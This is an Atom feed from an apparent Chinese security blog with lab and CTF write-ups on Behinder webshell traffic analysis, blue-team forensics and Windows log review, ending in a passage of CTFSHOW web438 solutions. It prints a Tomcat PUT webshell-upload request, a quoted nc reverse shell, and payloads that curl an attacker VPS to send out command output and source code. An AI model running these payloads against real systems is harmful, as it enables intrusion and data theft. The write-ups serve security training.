<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WayneJH Blog</title>
  
  
  <link href="https://waynejoon.github.io/atom.xml" rel="self"/>
  
  <link href="https://waynejoon.github.io/"/>
  <updated>2025-08-29T14:03:01.012Z</updated>
  <id>https://waynejoon.github.io/</id>
  
  <author>
    <name>WayneJoon.H</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>玄机靶场 | 冰蝎3.0-jsp流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/</id>
    <published>2025-08-29T14:02:19.000Z</published>
    <updated>2025-08-29T14:03:01.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="冰蝎3-0流量特征"><a href="#冰蝎3-0流量特征" class="headerlink" title="冰蝎3.0流量特征"></a>冰蝎3.0流量特征</h2><ul><li><strong>Content-Type</strong><br>POST请求的 <code>Content-Type</code> 固定为 <code>application/octet-stream</code>，属于强特征</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829203841563.png"></p><ul><li><strong>User-Agent</strong><br>内置了16个 <code>User-Agent</code> 头，通信时会随机挑选一个，但大多为老旧浏览器或罕见设备头，如果同一IP频繁变换UA且为这16个之一，可以高度怀疑是冰蝎</li><li><strong>Accept、Cache-Control</strong><br>Accept头常设为 <code>Accept: text/html, image/gif, image/jpeg, */*; q=.2, */*; q=.2</code> 或类似值，Cache-Control和Pragma常设为<code>no-cache</code>，表示直接从源服务器获取最新的响应，这些是冰蝎流量默认带的HTTP头，普通业务流量较少见</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829204637163.png"></p><ul><li><strong>Content-Length&#x2F;请求包长度</strong><br>因为冰蝎3.0使用AES-256加密算法，加密后的数据体积会膨胀，请求包长度一般会很大，超过正常业务范围</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829204859874.png"></p><p>想要更深入了解冰蝎3.0可以参考文章：<a href="https://www.freebuf.com/sectool/247009.html">冰蝎3.0流量特征分析（附特征）</a></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250829163939781.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>黑客IP是什么？</strong></p><p>先用wireshark语法筛选出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829164305832.png"></p><p>快速分析一遍流量，大部分都是404，说明黑客正在进行目录扫描。拉到最后那里可以看到有个异常流量，通过<strong>PUT方法</strong>上传了<code>indeX.jsp</code>文件，且在请求头中伪造了多个指向本地地址的字段（如<code>X-Forwarded-For</code>），这种组合是典型的攻击特征，由此可判定该请求为攻击者发起的恶意文件上传行为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829165356880.png"></p><p>因此黑客IP就是<code>192.168.31.61</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.61&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客上传的Webshell名是什么？</strong></p><p>继续分析流量包，可以看到攻击者通过POST数据包与<code>indeX.jsp</code>进行通信，且响应内容为加密数据</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829170738501.png"></p><p>因此webshell名就是这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;indeX.jsp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}）</strong></p><p>找到刚才黑客通过<strong>PUT方法上传的文件</strong>直接查看时间即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829202010142.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2025-02-22 07:47:38&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>木马的解密key是什么?</strong></p><p>同样也是PUT方法的那个流量包，右键追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829171501675.png"></p><p>可以看到黑客上传的内容，具体利用的漏洞是Tomcat通过PUT方法进行任意文件写入（CVE-2017-12615），感兴趣的可以网上了解一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829172047902.png"></p><p>可以看到木马连接密码就在文件内容当中，长度为16字节（128位），一般用于AES对称加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f0af7bb4dbcfbd7&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客执行的第一个命令是什么?</strong></p><p>已知黑客是通过POST与<code>indeX.jsp</code>进行通信，我们修改wireshark语法搜索包含<code>indeX.jsp</code>的流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;indeX.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250829182923377.png"></p><p>然后复制请求体data内容的<strong>ASCII值</strong>，如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829183018587.png"></p><p>这里用到希潭实验室的蓝队分析工具箱，下载地址：<a href="https://github.com/abc123info/BlueTeamTools">蓝队分析研判工具箱</a></p><p>把复制的数据和之前得到的密钥放进去解密</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829183611011.png"></p><p>可能受环境影响，我这边显示有点问题，不过内容还是可以看得懂。经过分析，前面几个数据包是冰蝎用于连接用的，分析到第四个时可以看到黑客执行的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829184827463.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829184509722.png"></p><p>因此黑客执行的第一个命令是<code>ifconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ifconfig&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客上传的文件内容是什么?</strong></p><p>继续分析，发现长度为362的流量记录了创建文件的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829191553272.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829191722209.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4ZmxhZ3s0ODUzNzViN2IwNmFkODU2YTc4OGMwZDk1MjI5ZjM1Y30=</span><br></pre></td></tr></table></figure><p>但是解码后得到一堆乱码，那只能登进目标服务器查看对应文件内容了</p><p>题目没有给出对应的服务器账号密码，需要我们渗透进去，那我们可以仿照前面黑客PUT上传文件的方法，用抓包工具修改发包</p><p>先自己随便选一个协议，生成服务端</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829195750644.png"></p><p>然后复制生成的jsp代码，粘贴到body中，同时修改请求体信息与之前黑客PUT上传的内容一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /6.jsp/ HTTP/1.1</span><br><span class="line">Host: 你的玄机靶机地址:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: JSESSIONID=3F426B8219ACAB91DF13B18D987842BC</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 782</span><br><span class="line"></span><br><span class="line">你的冰蝎jsp代码</span><br></pre></td></tr></table></figure><p>然后发包即可，状态码显示201表示成功</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200045977.png"></p><p>在冰蝎连接webshell，根据你之前选的协议选择对应的类别即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200227411.png"></p><p>连接后在<strong>文件管理</strong>处，找到<code>/home/xj/up.txt</code>，打开文件查看内容，成功拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200345195.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200417431.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;485375b7b06ad856a788c0d95229f35c&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>黑客下载的文件内容是什么?</strong></p><p>继续分析流量包，分析到最后一个请求包时发现有黑客执行下载文件的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201051081.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200641835.png"></p><p>对应路径为<code>/opt/apache-tomcat-8.5.19/conf/server.xml</code>，用冰蝎查看对应文件，成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200811216.png"></p><p>当然也可以查看对应的响应包，同样也给出了flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201003725.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3aacab9ca36a6894c75048e4faf47052&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>服务器内的flag是什么？</strong></p><p>用冰蝎在服务器内找就可以，最终发现flag在<code>/root/flag.txt</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201249812.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae1d04dd3d15c6a18f904fe50fdf7eca&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">冰蝎3.0-jsp流量分析详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 第九章-blueteam 的小心思3</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics-3/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics-3/</id>
    <published>2025-08-28T14:54:34.000Z</published>
    <updated>2025-08-28T14:55:35.028Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目简述：服务器有对外链接请求的痕迹，现提供一段 waf 上截获的数据包，分析对应的虚拟机环境跟数据包，找到关键字符串并且尝试修复漏洞</p><p>账号：<code>root</code>，密码：<code>root123</code>，流量包在<code>/result.pcap</code></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250828191310269.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip}</strong></p><p>先通过wireshark语法筛选出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828200609478.png"></p><p>我们简单分析这个流量包，前面有大量的404状态码，表明黑客正在进行目录扫描。后面黑客发现了<code>evil.php</code>文件，但是不知道参数名是什么，对参数名进行了大量尝试，最后发现参数<code>command</code>可以执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828201925705.png"></p><p>继续分析，可以看到黑客执行命令把<code>shell.php</code>下载到目标机器上</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828203209679.png"></p><p>因此可知攻击者下载恶意木马文件的ip地址为<code>192.168.150.253</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.150.253&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>审计流量包，木马文件连接密码是什么? flag{xxx}</strong></p><p>继续向下分析，可以看到攻击者通过POST数据包与<code>shell.php</code>进行通信</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828203800821.png"></p><p>因此连接密码就是<code>cmd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cmd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port}</strong></p><p>也是刚才的流量，我们对其内容进行<strong>base64解码</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250828204620822.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250828204706988.png"></p><p>发现<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>，结合前面的特征，可以推断这是通过蚁剑连接的。继续分析流量，发现有个流量记录了外连命令，通过nc反弹shell获得控制权</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828205330955.png"></p><p>因此攻击者反弹的IP和端口是<code>192.168.150.199:4444</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.150.199:4444&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>提交黑客上传恶意文件的 md5 md5sum xxx.so</strong></p><p>题目提示文件后缀是<code>.so</code>，我们直接wireshark语法搜索内容包含<code>.so</code>的流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp and frame contains &quot;.so&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250828220325856.png"></p><p>可以看到通过redis主从复制上传了一个<code>module.so</code>动态链接库。前面的<strong>RESP协议</strong>是Redis 客户端和服务器之间通信使用的协议</p><p>那我们修改wireshark语法搜索<strong>RESP协议</strong>的流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224546241.png"></p><p>经过分析，前面上传的<code>module.so</code>文件有问题，加载模块后无法执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224759344.png"></p><p>后面上传了一个符合条件的<code>module.so</code>文件，成功执行系统命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224923571.png"></p><p>攻击者执行了命令<code>nc -e /bin/bash 192.168.150.199 4444</code>反弹shell，因此可以确定这个就是恶意文件</p><p>登录目标靶机，在根目录下计算该文件的 MD5 值即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> module.so</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250828192857451.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d41d8cd98f00b204e9800998ecf8427e&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{<a href="http://xxxxxxxxxx/xx.xxx%7D">http://xxxxxxxxxx/xx.xxx}</a></strong></p><p>攻击者要想在服务器内维持权限，肯定是有后门的。然后题目说请求的外部地址和恶意文件的地址，那说明是会定期向外部发送请求的，我们直接查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>成功发现黑客留下的后门，通过<code>wget</code>定期向恶意地址下载webshell到目标机器，频率为每分钟执行一次</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828193116683.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;http://192.168.150.199:88/shell.php&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第九章-blueteam 的小心思3详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-windows日志分析base</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Windows-Security-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Windows-Security-Log-Analysis/</id>
    <published>2025-08-28T09:37:12.000Z</published>
    <updated>2025-08-28T09:38:37.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目描述：客户反映自己的用户在4月6日中午12点左右被挤掉线了，请你上机排查安全事件</p><p>RDP连接，端口3389，用户名：<code>Administrator</code>，密码：<code>4210bf?</code></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250828171821676.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>客户机的系统安全日志文件所在的绝对路径是？</strong></p><p><code>win+r</code>输入<code>eventvwr.msc</code>，打开事件查看器</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163049338.png"></p><p>然后点击<strong>windows日志</strong>，右键点击安全，打开属性</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163230401.png"></p><p>可以看到一个日志路径，这就是系统安全日志文件所在路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828172055458.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>但这是相对路径，我们复制<code>Security.evtx</code>前面的路径，然后在文件资源管理器打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163636089.png"></p><p>会跳转到目录<code>C:\Windows\System32\winevt\Logs</code>，这就是系统安全日志文件所在的绝对路径。该路径一般是固定的，建议记住该位置方便以后进行查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\Windows\System32\winevt\Logs&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>恶意用户是利用什么协议发起的登录？</strong></p><p>题目提示客户反映自己的用户在<strong>4月6日中午12点左右</strong>被挤掉线了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163940473.png"></p><p>先介绍一下常见的事件ID类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4624 登录成功</span><br><span class="line">4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息</span><br><span class="line">4726 删除用户</span><br><span class="line">4722 账号启用</span><br><span class="line">4725 账号禁用</span><br><span class="line">4723 修改密码</span><br><span class="line">4724 重置密码</span><br><span class="line">4634 注销成功</span><br><span class="line">4647 用户启动的注销</span><br><span class="line">4672 管理员登录</span><br><span class="line">4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录</span><br><span class="line">4732 加入安全组，常见于将新用户加入管理员组</span><br><span class="line">4733 移除出安全组</span><br><span class="line">4684 通过登陆界面登陆的</span><br></pre></td></tr></table></figure><p>我们返回事件查看器，设置筛选条件为4月6日早上9点到下午15点，由于是要查看攻击者是如何登陆的，所以事件ID我们选择4624和4625</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828164433294.png"></p><p>然后按照时间顺序逐个分析，我们主要关注登录的账号名、登录类型、登录是否成功以及登录源IP</p><p>其中登录类型是<strong>以数字的形式</strong>列举出来的，所以我们需要对照以下表格分析</p><table><thead><tr><th align="left">登录类型</th><th align="left">说明</th><th align="left">典型协议&#x2F;场景</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">交互式登录（本地键盘或控制台）</td><td align="left">本地</td></tr><tr><td align="left">3</td><td align="left">网络登录（访问共享、SMB等）</td><td align="left">SMB、HTTP（除明文）</td></tr><tr><td align="left">4</td><td align="left">批处理（计划任务）</td><td align="left">本地&#x2F;系统</td></tr><tr><td align="left">5</td><td align="left">服务账号</td><td align="left">本地&#x2F;系统</td></tr><tr><td align="left">7</td><td align="left">解锁（屏幕锁解锁）</td><td align="left">本地</td></tr><tr><td align="left">8</td><td align="left">网络明文（如HTTP Basic认证）</td><td align="left">明文HTTP、Advapi</td></tr><tr><td align="left">9</td><td align="left">新凭证（RunAs带netonly参数等）</td><td align="left">本地与网络混合</td></tr><tr><td align="left">10</td><td align="left">远程交互登录（RDP等）</td><td align="left">RDP（远程桌面协议）</td></tr><tr><td align="left">11</td><td align="left">缓存交互（离线域登录）</td><td align="left">本地缓存</td></tr></tbody></table><p>分析到<code>2025/4/6 11:33:34</code>的日志时发现异常，出现了一个未知的IP，且登录失败，然后协议类型为10，也就是利用rdp登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828165541901.png"></p><p>继续向下分析，发现该IP尝试了<strong>多个用户名</strong>进行rdp远程登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828165930030.png"></p><p>根据收集的结果，总共尝试了<code>admin</code>、<code>XJ</code>、<code>XuanJi</code>、<code>XiaoMa</code>和<code>Administrator</code>这几个用户名，其中前四个都登录失败，最后一个<code>Administrator</code>登录成功，可以看出该IP在进行用户名爆破，因此推断这就是攻击者</p><p>所以恶意用户是利用<strong>rdp协议</strong>发起的登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;rdp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>攻击者总共使用了几个账户名尝试登录？</strong></p><p>根据上一题的分析，可知攻击者使用了五个账号名尝试登录，分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin、XJ、XuanJi、XiaoMa、Administrator</span><br></pre></td></tr></table></figure><p>因此答案就是5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者总共在客户机上尝试创建了几个不同名用户？</strong></p><p>根据步骤二的常见事件ID类型，我们修改筛选条件为4720</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828170606089.png"></p><p>可以看到总共有五个日志，我们逐个分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828170731351.png"></p><p>发现有两个账号名均为<code>hack</code>，然后还有三个分别是<code>hacker</code>、<code>hacker_real$</code>、<code>system13$</code>，因此攻击者总共在客户机上尝试创建了4个不同名的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-windows日志分析base详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（三）web438 - web460</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-3-web438-web460/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-3-web438-web460/</id>
    <published>2025-08-27T07:50:29.000Z</published>
    <updated>2025-08-27T07:51:36.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第三部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web438"><a href="#web438" class="headerlink" title="web438"></a>web438</h3><p>这题跟web435方法一样，我们简单回顾一下过程</p><p>为了绕过限制，可以反转代码来执行，具体方法是用<strong>字符串切片</strong>方法来反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure><p>可以先用<code>str</code>在网页看原始代码，检查是否正确</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822185008504.png"></p><p>然后套个<code>exec</code>执行这串代码就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p>我们把它的源码爆出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span 